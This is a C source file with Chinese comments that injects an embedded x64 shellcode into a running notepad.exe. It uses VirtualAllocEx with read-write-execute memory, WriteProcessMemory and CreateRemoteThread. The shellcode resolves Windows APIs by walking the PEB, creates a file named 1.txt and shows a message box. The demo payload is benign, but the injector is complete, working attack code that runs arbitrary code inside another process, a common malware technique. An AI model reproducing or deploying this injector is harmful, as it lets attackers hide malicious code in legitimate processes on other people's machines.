// 用 gcc 直接编译
// 用 tcc 编译需要注意引入 windows 的头文件地址
// cmd> tcc -I"C:\Users\...\winapi-full-for-0.9.27\include\winapi" tcc_injecter.c
// tcc_injecter.c

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

BOOL LoadShellcode(DWORD dwProcessId, char* shellcode, int size) {
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;
    PSTR   pEntry = NULL;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,dwProcessId);
    pEntry = (PSTR)VirtualAllocEx(hProcess, NULL, 1 + size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, (PVOID)pEntry, (PVOID)shellcode, 1 + size, NULL);
    hThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)pEntry, NULL, 0, NULL);
    // WaitForSingleObject(hThread, INFINITE); // 是否等待注入任务执行完毕再继续此处后续的代码
    // VirtualFreeEx(hProcess,(PVOID)pEntry,0,MEM_RELEASE);
    // CloseHandle(hThread); // 是否关闭线程句柄
    return TRUE;
}

int getPidByProcessName(char* processname) {
    PROCESSENTRY32 ProcessEntry = { 0 };
    HANDLE hProcessSnap;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    BOOL bRet = Process32First(hProcessSnap,&ProcessEntry);
    while (bRet) {
        if(strcmp(processname,ProcessEntry.szExeFile) == 0) {
            return ProcessEntry.th32ProcessID;
        }
        bRet = Process32Next(hProcessSnap,&ProcessEntry);
    }
}

void main(int argc, char* argv[]) {
    // 下面的 shellcode 在被注入的目标程序的执行路径下创建一个 1.txt 文件，并在该线程下进行一次全 NULL 参数弹窗。
    unsigned char shellcode[] = {
        0x55,0x48, 0x89,0xe5, 0x48,0x81, 0xec,0x00, 0x00,0x00, 0x00,0xe8, 0xce,0x03, 0x00,0x00,
        0xc9,0xc3, 0x55,0x48, 0x89,0xe5, 0x48,0x81, 0xec,0xa0, 0x00,0x00, 0x00,0x48, 0x89,0x4d,
        0x10,0xb8, 0x4c,0x00, 0x00,0x00, 0x88,0x45, 0xf3,0xb8, 0x6f,0x00, 0x00,0x00, 0x88,0x45,
        0xf4,0xb8, 0x61,0x00, 0x00,0x00, 0x88,0x45, 0xf5,0xb8, 0x64,0x00, 0x00,0x00, 0x88,0x45,
        0xf6,0xb8, 0x4c,0x00, 0x00,0x00, 0x88,0x45, 0xf7,0xb8, 0x69,0x00, 0x00,0x00, 0x88,0x45,
        0xf8,0xb8, 0x62,0x00, 0x00,0x00, 0x88,0x45, 0xf9,0xb8, 0x72,0x00, 0x00,0x00, 0x88,0x45,
        0xfa,0xb8, 0x61,0x00, 0x00,0x00, 0x88,0x45, 0xfb,0xb8, 0x72,0x00, 0x00,0x00, 0x88,0x45,
        0xfc,0xb8, 0x79,0x00, 0x00,0x00, 0x88,0x45, 0xfd,0xb8, 0x41,0x00, 0x00,0x00, 0x88,0x45,
        0xfe,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45, 0xff,0xb8, 0x75,0x00, 0x00,0x00, 0x88,0x45,
        0xec,0xb8, 0x73,0x00, 0x00,0x00, 0x88,0x45, 0xed,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45,
        0xee,0xb8, 0x72,0x00, 0x00,0x00, 0x88,0x45, 0xef,0xb8, 0x33,0x00, 0x00,0x00, 0x88,0x45,
        0xf0,0xb8, 0x32,0x00, 0x00,0x00, 0x88,0x45, 0xf1,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45,
        0xf2,0xb8, 0x4d,0x00, 0x00,0x00, 0x88,0x45, 0xe0,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45,
        0xe1,0xb8, 0x73,0x00, 0x00,0x00, 0x88,0x45, 0xe2,0xb8, 0x73,0x00, 0x00,0x00, 0x88,0x45,
        0xe3,0xb8, 0x61,0x00, 0x00,0x00, 0x88,0x45, 0xe4,0xb8, 0x67,0x00, 0x00,0x00, 0x88,0x45,
        0xe5,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45, 0xe6,0xb8, 0x42,0x00, 0x00,0x00, 0x88,0x45,
        0xe7,0xb8, 0x6f,0x00, 0x00,0x00, 0x88,0x45, 0xe8,0xb8, 0x78,0x00, 0x00,0x00, 0x88,0x45,
        0xe9,0xb8, 0x41,0x00, 0x00,0x00, 0x88,0x45, 0xea,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45,
        0xeb,0xb8, 0x6b,0x00, 0x00,0x00, 0x88,0x45, 0xd7,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45,
        0xd8,0xb8, 0x72,0x00, 0x00,0x00, 0x88,0x45, 0xd9,0xb8, 0x6e,0x00, 0x00,0x00, 0x88,0x45,
        0xda,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45, 0xdb,0xb8, 0x6c,0x00, 0x00,0x00, 0x88,0x45,
        0xdc,0xb8, 0x33,0x00, 0x00,0x00, 0x88,0x45, 0xdd,0xb8, 0x32,0x00, 0x00,0x00, 0x88,0x45,
        0xde,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45, 0xdf,0xb8, 0x43,0x00, 0x00,0x00, 0x88,0x45,
        0xcb,0xb8, 0x72,0x00, 0x00,0x00, 0x88,0x45, 0xcc,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45,
        0xcd,0xb8, 0x61,0x00, 0x00,0x00, 0x88,0x45, 0xce,0xb8, 0x74,0x00, 0x00,0x00, 0x88,0x45,
        0xcf,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45, 0xd0,0xb8, 0x46,0x00, 0x00,0x00, 0x88,0x45,
        0xd1,0xb8, 0x69,0x00, 0x00,0x00, 0x88,0x45, 0xd2,0xb8, 0x6c,0x00, 0x00,0x00, 0x88,0x45,
        0xd3,0xb8, 0x65,0x00, 0x00,0x00, 0x88,0x45, 0xd4,0xb8, 0x41,0x00, 0x00,0x00, 0x88,0x45,
        0xd5,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45, 0xd6,0x48, 0x8b,0x45, 0x10,0x48, 0x89,0x45,
        0xc0,0xe8, 0x42,0x02, 0x00,0x00, 0x49,0x89, 0xc2,0x4c, 0x89,0xd1, 0xe8,0x5f, 0x02,0x00,
        0x00,0x48, 0x8b,0x4d, 0xc0,0x48, 0x89,0x01, 0x48,0x8b, 0x45,0x10, 0x48,0x83, 0xc0,0x08,
        0x48,0x8b, 0x4d,0x10, 0x48,0x89, 0x45,0xb8, 0x48,0x89, 0x4d,0xb0, 0xe8,0x17, 0x02,0x00,
        0x00,0x48, 0x8d,0x4d, 0xf3,0x49, 0x89,0xcb, 0x49,0x89, 0xc2,0x4c, 0x89,0xd1, 0x4c,0x89,
        0xda,0x4c, 0x8b,0x5d, 0xb0,0x4d, 0x8b,0x1b, 0x41,0xff, 0xd3,0x48, 0x8b,0x4d, 0xb8,0x48,
        0x89,0x01, 0x48,0x8b, 0x45,0x10, 0x48,0x83, 0xc0,0x18, 0x48,0x8b, 0x4d,0x10, 0x48,0x8b,
        0x55,0x10, 0x48,0x83, 0xc2,0x08, 0x48,0x89, 0x45,0xa8, 0x48,0x8d, 0x45,0xec, 0x49,0x89,
        0xc2,0x48, 0x89,0x4d, 0xa0,0x48, 0x89,0x55, 0x98,0x4c, 0x89,0xd1, 0x4c,0x8b, 0x5d,0x98,
        0x4d,0x8b, 0x1b,0x41, 0xff,0xd3, 0x48,0x8d, 0x4d,0xe0, 0x49,0x89, 0xcb,0x49, 0x89,0xc2,
        0x4c,0x89, 0xd1,0x4c, 0x89,0xda, 0x4c,0x8b, 0x5d,0xa0, 0x4d,0x8b, 0x1b,0x41, 0xff,0xd3,
        0x48,0x8b, 0x4d,0xa8, 0x48,0x89, 0x01,0x48, 0x8b,0x45, 0x10,0x48, 0x83,0xc0, 0x10,0x48,
        0x8b,0x4d, 0x10,0x48, 0x8b,0x55, 0x10,0x48, 0x83,0xc2, 0x08,0x48, 0x89,0x45, 0x90,0x48,
        0x8d,0x45, 0xd7,0x49, 0x89,0xc2, 0x48,0x89, 0x4d,0x88, 0x48,0x89, 0x55,0x80, 0x4c,0x89,
        0xd1,0x4c, 0x8b,0x5d, 0x80,0x4d, 0x8b,0x1b, 0x41,0xff, 0xd3,0x48, 0x8d,0x4d, 0xcb,0x49,
        0x89,0xcb, 0x49,0x89, 0xc2,0x4c, 0x89,0xd1, 0x4c,0x89, 0xda,0x4c, 0x8b,0x5d, 0x88,0x4d,
        0x8b,0x1b, 0x41,0xff, 0xd3,0x48, 0x8b,0x4d, 0x90,0x48, 0x89,0x01, 0xc9,0xc3, 0x55,0x48,
        0x89,0xe5, 0x48,0x81, 0xec,0x50, 0x00,0x00, 0x00,0x48, 0x89,0x4d, 0x10,0xb8, 0x2e,0x00,
        0x00,0x00, 0x88,0x45, 0xf8,0xb8, 0x2f,0x00, 0x00,0x00, 0x88,0x45, 0xf9,0xb8, 0x31,0x00,
        0x00,0x00, 0x88,0x45, 0xfa,0xb8, 0x2e,0x00, 0x00,0x00, 0x88,0x45, 0xfb,0xb8, 0x74,0x00,
        0x00,0x00, 0x88,0x45, 0xfc,0xb8, 0x78,0x00, 0x00,0x00, 0x88,0x45, 0xfd,0xb8, 0x74,0x00,
        0x00,0x00, 0x88,0x45, 0xfe,0xb8, 0x00,0x00, 0x00,0x00, 0x88,0x45, 0xff,0x48, 0x8b,0x45,
        0x10,0x48, 0x83,0xc0, 0x10,0x48, 0xb9,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x48,
        0x89,0x4c, 0x24,0x30, 0xb9,0x00, 0x00,0x00, 0x00,0x48, 0x89,0x4c, 0x24,0x28, 0xb9,0x02,
        0x00,0x00, 0x00,0x48, 0x89,0x4c, 0x24,0x20, 0x48,0xb9, 0x00,0x00, 0x00,0x00, 0x00,0x00,
        0x00,0x00, 0x49,0x89, 0xc9,0xb9, 0x00,0x00, 0x00,0x00, 0x49,0x89, 0xc8,0xb9, 0x00,0x00,
        0x00,0x40, 0x49,0x89, 0xcb,0x48, 0x8d,0x4d, 0xf8,0x49, 0x89,0xca, 0x48,0x89, 0x45,0xf0,
        0x4c,0x89, 0xd1,0x4c, 0x89,0xda, 0x4c,0x8b, 0x5d,0xf0, 0x4d,0x8b, 0x1b,0x41, 0xff,0xd3,
        0xc9,0xc3, 0x55,0x48, 0x89,0xe5, 0x48,0x81, 0xec,0x30, 0x00,0x00, 0x00,0x48, 0x89,0x4d,
        0x10,0x48, 0x8b,0x45, 0x10,0x48, 0x83,0xc0, 0x18,0xb9, 0x00,0x00, 0x00,0x00, 0x49,0x89,
        0xc9,0x48, 0xb9,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x49, 0x89,0xc8, 0x48,0xb9,
        0x00,0x00, 0x00,0x00, 0x00,0x00, 0x00,0x00, 0x49,0x89, 0xcb,0x48, 0xb9,0x00, 0x00,0x00,
        0x00,0x00, 0x00,0x00, 0x00,0x49, 0x89,0xca, 0x48,0x89, 0x45,0xf8, 0x4c,0x89, 0xd1,0x4c,
        0x89,0xda, 0x4c,0x8b, 0x5d,0xf8, 0x4d,0x8b, 0x1b,0x41, 0xff,0xd3, 0xc9,0xc3, 0x55,0x48,
        0x89,0xe5, 0x48,0x81, 0xec,0x40, 0x00,0x00, 0x00,0x48, 0x8d,0x45, 0xe0,0x49, 0x89,0xc2,
        0x4c,0x89, 0xd1,0xe8, 0x1a,0xfc, 0xff,0xff, 0x48,0x8d, 0x45,0xe0, 0x49,0x89, 0xc2,0x4c,
        0x89,0xd1, 0xe8,0xc7, 0xfe,0xff, 0xff,0x48, 0x8d,0x45, 0xe0,0x49, 0x89,0xc2, 0x4c,0x89,
        0xd1,0xe8, 0x6c,0xff, 0xff,0xff, 0xc9,0xc3, 0x55,0x48, 0x89,0xe5, 0x48,0x81, 0xec,0x00,
        0x00,0x00, 0x00,0x65, 0x48,0x8b, 0x04,0x25, 0x60,0x00, 0x00,0x00, 0x48,0x8b, 0x40,0x18,
        0x48,0x8b, 0x40,0x20, 0x48,0x8b, 0x00,0x48, 0x8b,0x00, 0x48,0x8b, 0x40,0x20, 0xc9,0xc3,
        0x55,0x48, 0x89,0xe5, 0x48,0x81, 0xec,0x50, 0x00,0x00, 0x00,0x48, 0x89,0x4d, 0x10,0x48,
        0x8b,0x45, 0x10,0x48, 0x89,0x45, 0xf8,0x48, 0x8b,0x45, 0xf8,0x48, 0x89,0x45, 0xf0,0x48,
        0x8b,0x45, 0xf0,0x48, 0x83,0xc0, 0x3c,0x8b, 0x08,0x48, 0x63,0xc9, 0x48,0x8b, 0x45,0xf8,
        0x48,0x01, 0xc8,0x48, 0x89,0x45, 0xe8,0x48, 0x8b,0x45, 0xe8,0x48, 0x83,0xc0, 0x18,0x48,
        0x83,0xc0, 0x70,0x8b, 0x08,0x48, 0x8b,0x45, 0xf8,0x48, 0x01,0xc8, 0x48,0x89, 0x45,0xe0,
        0x48,0x8b, 0x45,0xe0, 0x48,0x83, 0xc0,0x20, 0x8b,0x08, 0x48,0x8b, 0x45,0xf8, 0x48,0x01,
        0xc8,0x48, 0x89,0x45, 0xd8,0x48, 0x8b,0x45, 0xe0,0x48, 0x83,0xc0, 0x1c,0x8b, 0x08,0x48,
        0x8b,0x45, 0xf8,0x48, 0x01,0xc8, 0x48,0x89, 0x45,0xd0, 0x48,0x8b, 0x45,0xe0, 0x48,0x83,
        0xc0,0x24, 0x8b,0x08, 0x48,0x8b, 0x45,0xf8, 0x48,0x01, 0xc8,0x48, 0x89,0x45, 0xc8,0xb8,
        0x00,0x00, 0x00,0x00, 0x89,0x45, 0xbc,0x48, 0x8b,0x45, 0xe0,0x48, 0x83,0xc0, 0x18,0x8b,
        0x4d,0xbc, 0x8b,0x10, 0x39,0xd1, 0x0f,0x83, 0x7c,0x01, 0x00,0x00, 0xe9,0x0e, 0x00,0x00,
        0x00,0x8b, 0x45,0xbc, 0x48,0x89, 0xc1,0x83, 0xc0,0x01, 0x89,0x45, 0xbc,0xeb, 0xd8,0x8b,
        0x45,0xbc, 0x48,0xc1, 0xe0,0x02, 0x48,0x8b, 0x4d,0xd8, 0x48,0x01, 0xc1,0x8b, 0x01,0x48,
        0x8b,0x4d, 0xf8,0x48, 0x01,0xc1, 0x48,0x89, 0x4d,0xb0, 0x48,0x8b, 0x45,0xb0, 0x0f,0xbe,
        0x08,0x83, 0xf9,0x47, 0x0f,0x85, 0x39,0x01, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83,
        0xc0,0x01, 0x0f,0xbe, 0x08,0x83, 0xf9,0x65, 0x0f,0x85, 0x25,0x01, 0x00,0x00, 0x48,0x8b,
        0x45,0xb0, 0x48,0x83, 0xc0,0x02, 0x0f,0xbe, 0x08,0x83, 0xf9,0x74, 0x0f,0x85, 0x11,0x01,
        0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x03, 0x0f,0xbe, 0x08,0x83, 0xf9,0x50,
        0x0f,0x85, 0xfd,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x04, 0x0f,0xbe,
        0x08,0x83, 0xf9,0x72, 0x0f,0x85, 0xe9,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83,
        0xc0,0x05, 0x0f,0xbe, 0x08,0x83, 0xf9,0x6f, 0x0f,0x85, 0xd5,0x00, 0x00,0x00, 0x48,0x8b,
        0x45,0xb0, 0x48,0x83, 0xc0,0x06, 0x0f,0xbe, 0x08,0x83, 0xf9,0x63, 0x0f,0x85, 0xc1,0x00,
        0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x07, 0x0f,0xbe, 0x08,0x83, 0xf9,0x41,
        0x0f,0x85, 0xad,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x08, 0x0f,0xbe,
        0x08,0x83, 0xf9,0x64, 0x0f,0x85, 0x99,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83,
        0xc0,0x09, 0x0f,0xbe, 0x08,0x83, 0xf9,0x64, 0x0f,0x85, 0x85,0x00, 0x00,0x00, 0x48,0x8b,
        0x45,0xb0, 0x48,0x83, 0xc0,0x0a, 0x0f,0xbe, 0x08,0x83, 0xf9,0x72, 0x0f,0x85, 0x71,0x00,
        0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x0b, 0x0f,0xbe, 0x08,0x83, 0xf9,0x65,
        0x0f,0x85, 0x5d,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83, 0xc0,0x0c, 0x0f,0xbe,
        0x08,0x83, 0xf9,0x73, 0x0f,0x85, 0x49,0x00, 0x00,0x00, 0x48,0x8b, 0x45,0xb0, 0x48,0x83,
        0xc0,0x0d, 0x0f,0xbe, 0x08,0x83, 0xf9,0x73, 0x0f,0x85, 0x35,0x00, 0x00,0x00, 0x8b,0x45,
        0xbc,0x48, 0xc1,0xe0, 0x01,0x48, 0x8b,0x4d, 0xc8,0x48, 0x01,0xc1, 0x0f,0xb7, 0x01,0x48,
        0x63,0xc0, 0x48,0xc1, 0xe0,0x02, 0x48,0x8b, 0x4d,0xd0, 0x48,0x01, 0xc1,0x8b, 0x01,0x48,
        0x8b,0x4d, 0xf8,0x48, 0x01,0xc1, 0x48,0x89, 0x4d,0xc0, 0x48,0x8b, 0x45,0xc0, 0xe9,0x0f,
        0x00,0x00, 0x00,0xe9, 0x89,0xfe, 0xff,0xff, 0x48,0xb8, 0x00,0x00, 0x00,0x00, 0x00,0x00,
        0x00,0x00, 0xc9,0xc3, 
    };
    char processname[MAX_PATH] = TEXT("notepad.exe");
    int pid = getPidByProcessName(processname);
    LoadShellcode(pid, shellcode, sizeof(shellcode));
}